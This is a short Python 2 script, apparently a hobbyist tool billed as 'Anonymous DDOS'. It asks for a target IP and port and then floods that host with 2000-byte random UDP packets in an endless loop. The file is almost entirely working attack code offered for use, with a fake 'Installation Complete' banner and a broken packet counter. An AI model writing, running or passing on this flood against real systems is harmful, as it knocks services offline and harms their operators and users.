import sys
import os
import time
import socket
import random
print("Installation Complete")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(2000)
os.system("clear")
####
print("Welcome To Anonymous DDOS")
print("Made By PhucPC")
print("Channel Is PhucHoaYoutube")
print
ip = raw_input("Target IP: ")
port = input("Target PORT: ")

os.system("clear")
time.sleep(2)
print("The Target Was Successfully to attack")
time.sleep(2)
print("Attacking...")
sent = 0
while True:
	sock.sendto(bytes, (ip,port))
	sent = + 1 
	print("Attacked To the Target")
